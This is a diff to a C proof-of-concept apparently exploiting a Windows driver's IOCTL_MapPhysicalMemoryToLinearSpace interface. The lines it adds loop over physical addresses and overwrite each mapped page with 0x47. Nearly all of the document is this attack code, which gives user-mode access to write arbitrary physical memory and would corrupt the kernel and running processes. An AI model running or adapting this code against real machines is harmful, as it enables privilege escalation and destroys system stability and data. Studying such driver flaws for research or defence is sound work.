@@ -58,5 +58,21 @@ int main(char argc, char** argv)
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("Handle for PhysicalMemory: 0x%p\n", hPhysicalMemory);
 	system("pause");
+
+	PDWORD64 buf = (PDWORD64)malloc(0x1000);
+	if (buf == 0) {
+		exit(EXIT_FAILURE);
+	}
+
+	for (__int64 page = 0x100000000; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
+		MapPhysicalMemory(hPhysicalMemory, page, 0x1000, buf);
+		memset(buf, 0x47, 0x1000);
+		printf("Set %p to 0x47: \n", (void*)page);
+	}
+
+	free(buf);
+
+	CloseHandle(hPhysicalMemory);
+	CloseHandle(device);
 	return EXIT_SUCCESS;
 }
